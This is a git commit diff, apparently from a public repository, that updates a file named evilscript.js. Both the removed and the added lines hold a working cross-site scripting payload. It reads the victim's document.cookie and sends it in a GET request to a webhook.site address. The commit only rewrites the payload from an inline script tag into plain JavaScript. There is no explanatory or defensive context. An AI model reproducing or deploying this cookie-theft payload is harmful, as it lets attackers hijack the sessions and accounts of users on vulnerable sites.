6f1c651f2ae9e4106452dba1eb0f480bf9a1aa78
JASalgueiro <74070951+JASalgueiro@users.noreply.github.com>
2022-12-16 23:17:23 +0000

    Update evilscript.js

--- evilscript.js
+++ evilscript.js
@@ -1,1 +1,3 @@
-<script>let xhttp = new XMLHttpRequest();xhttp.open('GET', 'https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='+document.cookie);xhttp.send();</script>
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='+document.cookie);
+xhttp.send();
